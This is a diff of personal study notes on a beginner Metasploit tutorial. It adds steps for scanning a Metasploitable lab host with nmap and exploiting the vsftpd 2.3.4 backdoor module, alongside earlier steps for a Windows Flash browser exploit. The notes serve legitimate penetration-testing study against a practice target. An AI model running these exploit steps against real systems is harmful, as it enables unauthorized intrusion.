@@ -28,11 +28,19 @@ Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & 
   * search type:exploit platform:windows flash
   * help
   * use exploit/windows/browser/adobe_flash_avm2 (turns red if loaded)
+  * show options (customize the attack) and set SRVPORT 80
+  
+  ANOTHER and BETTER EXAMPLE:
+  * use ZenMap to see software running and note network topography
+  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
   * show (gives lots of info)
   * show info (good place to start)
-  * show options (customize the attack) and set SRVPORT 80
   * show payloads (shows all of the payloads available)
   * show targets
+  * search vsftpd
+  * use exploit/unix/ftp/vsftpd_234_backdoor
+  * info
+  * set RHOST 10.______
   * finish with 'exploit'
   <p>
   Modules directory:  /usr/share/metasploit-framework<br />
